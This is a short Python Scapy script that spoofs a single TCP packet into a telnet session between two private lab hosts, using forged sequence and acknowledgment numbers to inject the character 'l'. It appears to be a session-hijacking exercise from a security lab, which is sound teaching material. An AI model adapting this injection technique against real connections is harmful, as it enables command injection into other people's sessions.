#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=40892, dport=23, flags="A", seq=1459492985, ack=1755985709)
data = "l"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
